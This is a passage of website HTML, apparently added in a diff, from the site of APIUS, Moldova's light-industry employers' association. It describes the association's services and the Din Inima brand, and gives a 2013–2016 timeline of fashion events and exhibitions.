+		<h4 class="h-desc ">APIUS  reprezintă unica platformă  asociativă  care sporește  competitivitatea sectorului industriei ușoare  prin   oferirea  opurtunităților  de dezvoltare  pentru membrii săi prin diferite mecanisme de promovare, consultanță și creșterea exportului. </h4>
+		<!-- Boxes -->
+		<div class="boxes ">
+		
+			<!-- Box 1 -->
+			<div class="col-xs-3 about-box animated" data-animation="fadeIn" data-animation-delay="100">
+				<a class="about-icon">
+				<i class="ff-font-awesome icon-cog"></i>
+				</a>
+				<p class="uppercase normal about-head">Capacitate interna şi dezvoltare instituţională </p>
+				<p class="light about-text">  Dezvoltarea şi consolidarea capacităţilor asociaţiei prin  transmiterea newslatter-lor către membri și parteneri,  organizarea  evenimentelor de networking precum și  atragerea surselor de finanțare. </p>
+			</div>
+		
+		
+			<!-- Box 1 -->
+			<div class="col-xs-3 about-box animated" data-animation="fadeIn" data-animation-delay="100">
+				<a class="about-icon">
+				<i class="ff-font-awesome icon-graduation-cap"></i>
+				</a>
+				<p class="uppercase normal about-head">Educaţie şi dezvoltarea resurselor  umane</p>
+				<p class="light about-text">  Intergrarea efectivă a sectorului public (universitatea, şcolile profesionale) în comunitatea economică din industria uşoară. </p>
+			</div>
+		
+		
+			<!-- Box 1 -->
+			<div class="col-xs-3 about-box animated" data-animation="fadeIn" data-animation-delay="100">
+				<a class="about-icon">
+				<i class="ff-font-awesome icon-mobile"></i>
+				</a>
+				<p class="uppercase normal about-head">Piaţa interna şi branduri autohtone  </p>
+				<p class="light about-text"> Consolidarea brandului Din inima prin organizarea campaniilor de promovare, deschiderea platformelor comerciale  precum și  organizarea prezentărilor de modă. </p>
+			</div>
+		
+		
+			<!-- Box 1 -->
+			<div class="col-xs-3 about-box animated" data-animation="fadeIn" data-animation-delay="100">
+				<a class="about-icon">
+				<i class="ff-font-awesome icon-flight"></i>
+				</a>
+				<p class="uppercase normal about-head">Export şi promovare internaţională  </p>
+				<p class="light about-text"> Creșterea exportului   sectorului IU  prin  participarea consolidată  la cele mai renumite expoziții internaționale   sub stand comun de țară. </p>
+			</div>
+		
+		
+			<!-- Box 1 -->
+			<div class="col-xs-4 about-box animated" data-animation="fadeIn" data-animation-delay="100">
+				<a class="about-icon">
+				<i class="ff-font-awesome icon-table"></i>
+				</a>
+				<p class="uppercase normal about-head">Baza de date cu servicii</p>
+				<p class="light about-text">Baza de date cu servicii – acces la  platforma  cu servicii cu preț special pentru membrii APIUS necesare pentru dezvoltarea eficientă </p>
+			</div>
+		
+		
+			<!-- Box 1 -->
+			<div class="col-xs-4 about-box animated" data-animation="fadeIn" data-animation-delay="100">
+				<a class="about-icon">
+				<i class="ff-font-awesome icon-empire"></i>
+				</a>
+				<p class="uppercase normal about-head">Lobby şi advocacy</p>
+				<p class="light about-text">  Promovarea  intereselor  membrilor APIUS  prin influențarea politicilor publice și a instituțiilor guvernamentale  în susținerea mediului de afaceri din sector. </p>
+			</div>
+		
+		
+			<!-- Box 1 -->
+			<div class="col-xs-4 about-box animated" data-animation="fadeIn" data-animation-delay="100">
+				<a class="about-icon">
+				<i class="ff-font-awesome icon-scissors"></i>
+				</a>
+				<p class="uppercase normal about-head">ZIP House</p>
+				<p class="light about-text">Centru de excelenţă în tehnologie şi design.</p>
+			</div>
+		
+		
+			<!-- Box 1 -->
+			<div class="col-xs-12 about-box animated" data-animation="fadeIn" data-animation-delay="100">
+				<a class="about-icon">
+				<i class="ff-font-awesome icon-search"></i>
+				</a>
+				<p class="uppercase normal about-head">Biblioteca Textilă </p>
+				<p class="light about-text">Biblioteca Textilă -  acces la resurse de top din domeniul fashion și designului, diverse tipuri de textile de trend, care se  pot accesa atît fizic cît și în format electronic.</p>
+			</div>
+		
+					
+		</div>
+		<!-- End Boxes -->
+	</div>
+	<!-- End About Inner -->
+</section>
+<!-- End About Section -->
+
+
+<!-- Services -->
+<section id="services" style="background: url('http://apius.md/wp-content/uploads/2014/08/i1.jpg') center center fixed;" class="container parallax1 ff-parallax ff-background-size-cover">
+	<div class="inner">
+		<!-- Header -->
+		<h1 class="header bold white">DE CE SĂ ALEGI APIUS</h1>
+		<!-- Description -->
+		<h4 class="h-desc white">APIUS este singura organizaţie de încredere, care reprezintă comunitatea de business din sectorul industriei uşoare prin colaborarea cu parteneri strategici/donatori şi instituţii de stat. </h4>
+		<!-- Boxes -->
+		<div class="service-boxes">
+					<!-- Box 1 -->
+			<div class="col-xs-4 service-box animated" data-animation="fadeIn" data-animation-delay="200" data-toggle="tooltip" data-placement="top" title="Coordonarea si gestionarea proiectului Din inima Branduri de Moldova.
+•	Coordonarea Campaniilor de promovare Din inima;
+•	Organizarea fashion show-urilor Din inima;
+•	Asistență în organizarea și desfășurarea de pop-up- uri  .
+">
+				<!-- Icon -->
+				<a class="service-icon">
+				<i class="ff-font-awesome icon-heart-empty"></i>
+				</a>
+				<!-- Header -->
+				<p class="service-header light white">PROIECTUL DIN INIMA</p>
+			</div>
+					<!-- Box 1 -->
+			<div class="col-xs-4 service-box animated" data-animation="fadeIn" data-animation-delay="200" data-toggle="tooltip" data-placement="top" title="Promovarea produselor şi serviciilor companiilor din sector prin informaţii de piaţă şi facilitarea participării la expoziţii şi evenimente de promovare cu suportul proiectului de Competitivitate al USAID.
+Organizarea si sustinerea proiectelor colective ale companiilor din industria modei">
+				<!-- Icon -->
+				<a class="service-icon">
+				<i class="ff-font-awesome icon-money"></i>
+				</a>
+				<!-- Header -->
+				<p class="service-header light white">SUSŢINERE/FINANŢARE USAID</p>
+			</div>
+					<!-- Box 1 -->
+			<div class="col-xs-4 service-box animated" data-animation="fadeIn" data-animation-delay="200" data-toggle="tooltip" data-placement="top" title="Consolidarea relaţiilor cu structurile de stat şi dialog durabil cu Guvernul printr-un punct de vedere consolidat.">
+				<!-- Icon -->
+				<a class="service-icon">
+				<i class="ff-font-awesome icon-users"></i>
+				</a>
+				<!-- Header -->
+				<p class="service-header light white">DIALOG PUBLIC PRIVAT</p>
+			</div>
+					<!-- Box 1 -->
+			<div class="col-xs-4 service-box animated" data-animation="fadeIn" data-animation-delay="200" data-toggle="tooltip" data-placement="top" title="Parteneriat public-privat cu Centrul de Excelenta in Tehnologii si Design – ZIPhouse.">
+				<!-- Icon -->
+				<a class="service-icon">
+				<i class="ff-font-awesome icon-scissors"></i>
+				</a>
+				<!-- Header -->
+				<p class="service-header light white">ZIP HOUSE</p>
+			</div>
+					<!-- Box 1 -->
+			<div class="col-xs-4 service-box animated" data-animation="fadeIn" data-animation-delay="200" data-toggle="tooltip" data-placement="top" title="Dezvoltarea resurselor umane prin programe de instruire şi o bibliotecă de literatură profesională in cadrul ZIPhouse.">
+				<!-- Icon -->
+				<a class="service-icon">
+				<i class="ff-font-awesome icon-search"></i>
+				</a>
+				<!-- Header -->
+				<p class="service-header light white">BIBLIOTECA TEXTILA</p>
+			</div>
+					<!-- Box 1 -->
+			<div class="col-xs-4 service-box animated" data-animation="fadeIn" data-animation-delay="200" data-toggle="tooltip" data-placement="top" title="•	Stabilirea și dezvoltarea relațiilor comerciale dintre membrii asociației și parteneri  străini  (misiuni comerciale, producatori, showroom-uri);
+•	Organizarea in parteneriat cu MOLDEXPO  a expozitiei specializate Moldova fashion Expo ( reduceri la spatiu pentru membri); 
+•	Furnizare de servicii de consultanță pentru membrii Asociației.
+">
+				<!-- Icon -->
+				<a class="service-icon">
+				<i class="ff-font-awesome icon-lightbulb"></i>
+				</a>
+				<!-- Header -->
+				<p class="service-header light white">INSTRUIRE/DEZVOLTARE/PARTENRIAT</p>
+			</div>
+					<div class="clear"></div>
+		</div>
+		<!-- End Boxes -->
+	</div>
+	<!-- End Service Inner -->
+</section>
+<!-- End Services Section -->	<section id="home-bottom" class="relative full-width clearfix">
+		<div class="home-bottom-inner clearfix">
+			<div class="col-xs-7 no-padding t-left left">
+				<h2 class="white normal no-margin no-padding">
+					<span class="colored condiment bigger"> Vrei sa devi membru Apius?</span>				</h2>
+			</div>
+			<div class="col-xs-5 no-padding t-right">
+				<span class="white normal no-margin no-padding">
+					Completeaza formularul				</span>
+				<a href="http://apius.md/wp-content/uploads/2016/09/cerere_de_aderare_-ROM.doc" class="home-bottom-button normal colored-bg white uppercase scroll">
+					Incepe				</a>
+			</div>
+		</div>
+	</section>
+<div id="kokot">
+	<!-- History -->
+	<section id="history" class="container parallax3 ff-parallax ff-background-size-cover has-bg"  style="background: url('http://apius.md/wp-content/uploads/2014/08/i3.jpg') center center fixed;">
+
+	<div class="inner history">
+
+			<!-- Header -->
+			<h1 class="header light dark">Istoria<span class="condiment">APIUS</span></h1>
+
+			<!-- Description -->
+			<h4 class="h-desc dark">Asociația Patronală a Industriei Ușoare <span class="dark bold">APIUS</span> a fost creată ca și o asociație dedicată dezvoltării segmentului economic de industrie ușoară, dar și a fiecărui producător în parte. </h4>
+
+			<ul class="timeline">
+			<li class="time today">2016</li><li class="note animated" data-animation="fadeInLeft" data-animation-delay="200"><p class="history-date no-margin uppercase normal">3 Nov 16</p><p class="history-head uppercase semibold">Fashion Week Moldova</p><p class="history-desc no-margin normal"> La Moldova Fashion Expo  vizitatorii au putut admira cele mai noi colecții ale brandurilor autohtone. </p><div class="timeline-images"><a href="http://apius.md/wp-content/uploads/2014/08/15036434_1143950588992032_5612873555853117221_n.jpg"  data-rel="prettyPhoto[historygallery0]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/15036434_1143950588992032_5612873555853117221_n.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/15000636_1143950598992031_5287815595218819327_o.jpg"  data-rel="prettyPhoto[historygallery0]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/15000636_1143950598992031_5287815595218819327_o.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/56df141c0ed57.jpg"  data-rel="prettyPhoto[historygallery0]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/56df141c0ed57.jpg" alt="" /></a></div><span class="note-arrow"></span></li><li class="note animated" data-animation="fadeInRight" data-animation-delay="200"><p class="history-date no-margin uppercase normal">25 Oct 16</p><p class="history-head uppercase semibold">Magazinul ,,Dininimă”  în CC ,,UNIC”</p><p class="history-desc no-margin normal">În incinta Centrului Comercial ,,UNIC’’ a avut loc deschiderea oficială a celui de-al treilea magazin ,,Dininimă”. </p><div class="timeline-images"><a href="http://apius.md/wp-content/uploads/2014/08/14572819_1358670820810976_381442051573921178_n.jpg"  data-rel="prettyPhoto[historygallery1]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/14572819_1358670820810976_381442051573921178_n.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/14601045_1330607770316883_5971811605459266458_n.jpg"  data-rel="prettyPhoto[historygallery1]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/14601045_1330607770316883_5971811605459266458_n.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/14721750_1358670847477640_4839605607558889751_n.jpg"  data-rel="prettyPhoto[historygallery1]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/14721750_1358670847477640_4839605607558889751_n.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/14725628_1214996415239731_4881734479900180024_n.jpg"  data-rel="prettyPhoto[historygallery1]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/14725628_1214996415239731_4881734479900180024_n.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/14720563_1214996351906404_7943538719840669363_n.jpg"  data-rel="prettyPhoto[historygallery1]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/14720563_1214996351906404_7943538719840669363_n.jpg" alt="" /></a></div><span class="note-arrow"></span></li><li class="note animated" data-animation="fadeInLeft" data-animation-delay="200"><p class="history-date no-margin uppercase normal">10 Sep 16</p><p class="history-head uppercase semibold">Moldova Fashion Days</p><p class="history-desc no-margin normal">Designerii și producătorii din Moldova au prezentat publicului noile colecții pentru sezonul toamna-iarna 2016.</p><div class="timeline-images"><a href="http://apius.md/wp-content/uploads/2014/08/3-5.jpg"  data-rel="prettyPhoto[historygallery2]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/3-5.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/2-5-221x300.jpg"  data-rel="prettyPhoto[historygallery2]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/2-5-221x300.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/a-doua-zi-a-evenimentul-moldova-fashion-days-fall-winter-2016-foto.jpg"  data-rel="prettyPhoto[historygallery2]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/a-doua-zi-a-evenimentul-moldova-fashion-days-fall-winter-2016-foto.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/853b47271123f12f24dd67f4131f14aa.jpg"  data-rel="prettyPhoto[historygallery2]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/853b47271123f12f24dd67f4131f14aa.jpg" alt="" /></a></div><span class="note-arrow"></span></li><li class="note animated" data-animation="fadeInRight" data-animation-delay="200"><p class="history-date no-margin uppercase normal">8 Sep 16</p><p class="history-head uppercase semibold">10 ani APIUS</p><p class="history-desc no-margin normal">Asociația Patronală din Industria Ușoară a sărbătorit 10 ani de activitate. De-a lungul timpului, APIUS a reușit să crească, să se dezvolte și să creeze proiecte valoroase.</p><div class="timeline-images"><a href="http://apius.md/wp-content/uploads/2014/08/DSC00840.jpg"  data-rel="prettyPhoto[historygallery3]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/DSC00840.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/DSC00938.jpg"  data-rel="prettyPhoto[historygallery3]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/DSC00938.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/DSC00844.jpg"  data-rel="prettyPhoto[historygallery3]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/DSC00844.jpg" alt="" /></a></div><span class="note-arrow"></span></li><li class="note animated" data-animation="fadeInLeft" data-animation-delay="200"><p class="history-date no-margin uppercase normal">28 Jul 16</p><p class="history-head uppercase semibold">Participarea brandurilor autohtone la expoziția internațională GDS</p><p class="history-desc no-margin normal">7 producători de încălțăminte și accesorii din Moldova – Cristina,Tighina, Floare, Hîncu, Oldcom, Olsa Shoes și Vitalie Burlacu au participat la cea mai mare expoziție internaționala de profil din lume - GDS –Global Destination for Shoes&Accesories.</p><div class="timeline-images"><a href="http://apius.md/wp-content/uploads/2014/08/GDS-Global-Destination-For-Shoes-and-Accessories.jpg"  data-rel="prettyPhoto[historygallery4]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/GDS-Global-Destination-For-Shoes-and-Accessories.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/13626483_1196149183770785_7313465983974768156_n.jpg"  data-rel="prettyPhoto[historygallery4]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/13626483_1196149183770785_7313465983974768156_n.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/1_001.jpg"  data-rel="prettyPhoto[historygallery4]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/1_001.jpg" alt="" /></a></div><span class="note-arrow"></span></li><li class="note animated" data-animation="fadeInRight" data-animation-delay="200"><p class="history-date no-margin uppercase normal">9 Jul 16</p><p class="history-head uppercase semibold">Participarea la Festivalul „IA MANIA”,</p><p class="history-desc no-margin normal">8 branduri autohtone de vestimentație sub umbrela „Din Inimă –Branduri de Moldova”: Lavielace, Georgette, Oldcom, Mallena, Cireshel, Brio,Sweet Baby și Julie Anne Millinery și-au prezentat colecțiile de vară.</p><span class="note-arrow"></span></li><li class="note animated" data-animation="fadeInLeft" data-animation-delay="200"><p class="history-date no-margin uppercase normal">12 Jul 16</p><p class="history-head uppercase semibold">Participarea la expoziția LEATHER AND SHOES din Kiev</p><p class="history-desc no-margin normal">4 producători de încălțăminte–Tighina, Floare, Oldcom, Olsa Shoes au participat la cea mai mare expoziție de încălțăminte,piele și blănuri din Ucraina – LEATHER AND SHOES 2016</p><span class="note-arrow"></span></li><li class="note animated" data-animation="fadeInRight" data-animation-delay="200"><p class="history-date no-margin uppercase normal">29 Jun 16</p><p class="history-head uppercase semibold">GALA NOTORIUM</p><p class="history-desc no-margin normal">Brandul DIN INIMĂ decorat cu premiul de excelență la gala NOTORIUM</p><div class="timeline-images"><a href="http://apius.md/wp-content/uploads/2014/08/notorrium.jpg"  data-rel="prettyPhoto[historygallery7]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/notorrium.jpg" alt="" /></a></div><span class="note-arrow"></span></li><li class="note animated" data-animation="fadeInLeft" data-animation-delay="200"><p class="history-date no-margin uppercase normal">7 Jun 16</p><p class="history-head uppercase semibold">Fashion Soiree DIN INIMĂ</p><p class="history-desc no-margin normal">Brandurile autohtone sub umbrela „Branduri DININIMĂ”, au dat tonul verii, și au fost prezentate la Chișinău, pentru prima dată în aer liber.</p><div class="timeline-images"><a href="http://apius.md/wp-content/uploads/2014/08/Fashion-soiree_designers-1024x385.jpg"  data-rel="prettyPhoto[historygallery8]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/Fashion-soiree_designers-1024x385.jpg" alt="" /></a></div><span class="note-arrow"></span></li><li class="note animated" data-animation="fadeInRight" data-animation-delay="200"><p class="history-date no-margin uppercase normal">28 May 16</p><p class="history-head uppercase semibold">Festivalul Mai dulce</p><p class="history-desc no-margin normal">Brandurile  ”Din Inimă” a amplasat cel mai fastuos și mare cort în care vizitatorii puteau nu doar să vadă hainele preferate, dar și să le probeze.</p><div class="timeline-images"><a href="http://apius.md/wp-content/uploads/2014/08/13325607_1201346023243059_9055977221908199019_n.jpg"  data-rel="prettyPhoto[historygallery9]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/13325607_1201346023243059_9055977221908199019_n.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/13321963_1201346153243046_8400087878317960958_n.jpg"  data-rel="prettyPhoto[historygallery9]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/13321963_1201346153243046_8400087878317960958_n.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/13312740_1201346359909692_438369400816088872_n.jpg"  data-rel="prettyPhoto[historygallery9]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/13312740_1201346359909692_438369400816088872_n.jpg" alt="" /></a></div><span class="note-arrow"></span></li><li class="time today">2015</li><li class="note animated" data-animation="fadeInLeft" data-animation-delay="200"><p class="history-date no-margin uppercase normal">19 Nov 15</p><p class="history-head uppercase semibold">Inspiring Women in Fashion Business</p><p class="history-desc no-margin normal">Au fost initiate, incurajate si premiate femeile care dezvolta afaceri in domeniul Fashion. </p><div class="timeline-images"><a href="http://apius.md/wp-content/uploads/2014/08/12248067_1118670218144372_2731073300262600658_o.jpg"  data-rel="prettyPhoto[historygallery10]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/12248067_1118670218144372_2731073300262600658_o.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/12244380_1118670498144344_6079113981569311512_o.jpg"  data-rel="prettyPhoto[historygallery10]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/12244380_1118670498144344_6079113981569311512_o.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/12240416_1118670581477669_2716929801534261708_o.jpg"  data-rel="prettyPhoto[historygallery10]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/12240416_1118670581477669_2716929801534261708_o.jpg" alt="" /></a></div><span class="note-arrow"></span></li><li class="note animated" data-animation="fadeInRight" data-animation-delay="200"><p class="history-date no-margin uppercase normal">5 Nov 15</p><p class="history-head uppercase semibold">Moldova Fashion Expo 2015</p><p class="history-desc no-margin normal">Prezentarea colectiilor 2015 a tutror membrilor APIUS si Din Inima</p><div class="timeline-images"><a href="http://apius.md/wp-content/uploads/2014/08/12122607_915578861829207_4454980288796859330_n.jpg"  data-rel="prettyPhoto[historygallery11]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/12122607_915578861829207_4454980288796859330_n.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/12208756_915578831829210_6776026445888903677_n.jpg"  data-rel="prettyPhoto[historygallery11]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/12208756_915578831829210_6776026445888903677_n.jpg" alt="" /></a></div><span class="note-arrow"></span></li><li class="note animated" data-animation="fadeInLeft" data-animation-delay="200"><p class="history-date no-margin uppercase normal">13 Jul 15</p><p class="history-head uppercase semibold">GDS Exposition</p><p class="history-desc no-margin normal">Participarea celor mai notorii producatori locali. </p><div class="timeline-images"><a href="http://apius.md/wp-content/uploads/2014/08/11061771_875305255856568_4308642788277526697_n.jpg"  data-rel="prettyPhoto[historygallery12]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/11061771_875305255856568_4308642788277526697_n.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/11825712_875303932523367_5387221871086968944_n.jpg"  data-rel="prettyPhoto[historygallery12]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/11825712_875303932523367_5387221871086968944_n.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/11825880_874983079222119_7600845552115209267_n.jpg"  data-rel="prettyPhoto[historygallery12]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/11825880_874983079222119_7600845552115209267_n.jpg" alt="" /></a></div><span class="note-arrow"></span></li><li class="note animated" data-animation="fadeInRight" data-animation-delay="200"><p class="history-date no-margin uppercase normal">16 Sep 15</p><p class="history-head uppercase semibold">Expozitia Asia Centrala</p><p class="history-desc no-margin normal">Cele mai notorii branduri din Rapublica Moldova au participat la cel mai imortant eveniment din domeniu din spatiul Asiei Centrale Cu suportul APIUS</p><div class="timeline-images"><a href="http://apius.md/wp-content/uploads/2014/08/11047871_896210907099336_6291662701052346999_n.jpg"  data-rel="prettyPhoto[historygallery13]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/11047871_896210907099336_6291662701052346999_n.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/12002885_896094297110997_2972742823820504341_n.jpg"  data-rel="prettyPhoto[historygallery13]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/12002885_896094297110997_2972742823820504341_n.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/12006204_896211067099320_1986641293047390256_n.jpg"  data-rel="prettyPhoto[historygallery13]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/12006204_896211067099320_1986641293047390256_n.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/12009656_896094293777664_9182841913659653551_n.jpg"  data-rel="prettyPhoto[historygallery13]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/12009656_896094293777664_9182841913659653551_n.jpg" alt="" /></a></div><span class="note-arrow"></span></li><li class="note animated" data-animation="fadeInLeft" data-animation-delay="200"><p class="history-date no-margin uppercase normal">5 Sep 15</p><p class="history-head uppercase semibold">Deschiderea ZIP House</p><p class="history-desc no-margin normal">Primul centru de excelenta in Industria Usoara, inaugurat cu suportul USAID in Moldova.</p><div class="timeline-images"><a href="http://apius.md/wp-content/uploads/2014/08/11990503_1125820530779129_8985608759934232103_n.jpg"  data-rel="prettyPhoto[historygallery14]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/11990503_1125820530779129_8985608759934232103_n.jpg" alt="" /></a></div><span class="note-arrow"></span></li><li class="time today">2014</li><li class="note animated" data-animation="fadeInRight" data-animation-delay="200"><p class="history-date no-margin uppercase normal">8 May 14</p><p class="history-head uppercase semibold">Extindere Zorile</p><p class="history-desc no-margin normal">Cel mai important centru comercial dedicat brandurilor locale este extins si devine Nr. 1 in tara. </p><div class="timeline-images"><a href="http://apius.md/wp-content/uploads/2014/08/1268700_665048686882227_7779546336764709286_o.jpg"  data-rel="prettyPhoto[historygallery15]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/1268700_665048686882227_7779546336764709286_o.jpg" alt="" /></a></div><span class="note-arrow"></span></li><li class="time today">2013</li><li class="note animated" data-animation="fadeInLeft" data-animation-delay="200"><p class="history-date no-margin uppercase normal">20 Dec 13</p><p class="history-head uppercase semibold">Vizita la casa Municipala pentru copii orfani </p><p class="history-desc no-margin normal">Brandurile Din Inima au adus un pic de sarbatoare in inimioarele copiilor orfani. </p><div class="timeline-images"><a href="http://apius.md/wp-content/uploads/2014/08/1483930_604207609633002_1520113381_o.jpg"  data-rel="prettyPhoto[historygallery16]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/1483930_604207609633002_1520113381_o.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/1496147_604207856299644_150989026_o.jpg"  data-rel="prettyPhoto[historygallery16]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/1496147_604207856299644_150989026_o.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/1523990_604207746299655_962850420_o.jpg"  data-rel="prettyPhoto[historygallery16]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/1523990_604207746299655_962850420_o.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/1527035_604207376299692_1241123728_n.jpg"  data-rel="prettyPhoto[historygallery16]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/1527035_604207376299692_1241123728_n.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/1534785_604207882966308_1165929700_o.jpg"  data-rel="prettyPhoto[historygallery16]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/1534785_604207882966308_1165929700_o.jpg" alt="" /></a></div><span class="note-arrow"></span></li><li class="note animated" data-animation="fadeInRight" data-animation-delay="200"><p class="history-date no-margin uppercase normal">2 Mar 13</p><p class="history-head uppercase semibold">Moldova Spring Fashion wolk 2013</p><p class="history-desc no-margin normal">Un eveniment organizat la Palatul Republicii cu distinsa participare a Primei Doamne si cu sustinerea Prim-Ministrului Republicii Moldova. </p><div class="timeline-images"><a href="http://apius.md/wp-content/uploads/2014/08/Moldova-Spring-Fashion-Walk-2013.jpg"  data-rel="prettyPhoto[historygallery17]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/Moldova-Spring-Fashion-Walk-2013.jpg" alt="" /></a><a href="http://protv.md/stiri/social/margareta-timofti-a-defilat-pe-podium-in-haine-made-in-moldova.html"  data-rel="prettyPhoto[historygallery17]" class="timeline-image"><img src="http://apius.md/wp-content/themes/oxygen/images/history/video.png" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/Moldova-Spring-Fashion-Walk-2013-2.jpg"  data-rel="prettyPhoto[historygallery17]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/Moldova-Spring-Fashion-Walk-2013-2.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/420347_481830565212560_1703529096_n.jpg"  data-rel="prettyPhoto[historygallery17]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/420347_481830565212560_1703529096_n.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/69258_10151364036244081_1680556915_n.jpg"  data-rel="prettyPhoto[historygallery17]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/69258_10151364036244081_1680556915_n.jpg" alt="" /></a></div><span class="note-arrow"></span></li><li class="note animated" data-animation="fadeInLeft" data-animation-delay="200"><p class="history-date no-margin uppercase normal">14 Nov 13</p><p class="history-head uppercase semibold">Expozitie Internationala  Specializata de marfuri, utilaje si materii prime pentru industria usoara</p><p class="history-desc no-margin normal">Expozitia a XIII-a , Organizata de catre CIE Moldexpo SA in colaborare cu MInisterul Economiei al Republicii Moldova. </p><div class="timeline-images"><a href="http://apius.md/wp-content/uploads/2014/08/56df14e5714cb.jpg"  data-rel="prettyPhoto[historygallery18]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/56df14e5714cb.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/56df15d6746d3.jpg"  data-rel="prettyPhoto[historygallery18]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/56df15d6746d3.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/56df147c9ce27.jpg"  data-rel="prettyPhoto[historygallery18]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/56df147c9ce27.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/1424477_587282617992168_75995098_n.jpg"  data-rel="prettyPhoto[historygallery18]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/1424477_587282617992168_75995098_n.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/1441289_587281821325581_1456941048_n.jpg"  data-rel="prettyPhoto[historygallery18]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/1441289_587281821325581_1456941048_n.jpg" alt="" /></a></div><span class="note-arrow"></span></li><li class="note animated" data-animation="fadeInRight" data-animation-delay="200"><p class="history-date no-margin uppercase normal">28 Aug 13</p><p class="history-head uppercase semibold">Lansarea celei de a 2-a platforme comune "Din Inima: Branduri de Moldova" </p><p class="history-desc no-margin normal">Pentru a aduce mai aproape de consumator brandurile Din Inima au fost concentrate intr-un centru comercial in colaborare cu retea-ua de supermaket-uri Linella. </p><div class="timeline-images"><a 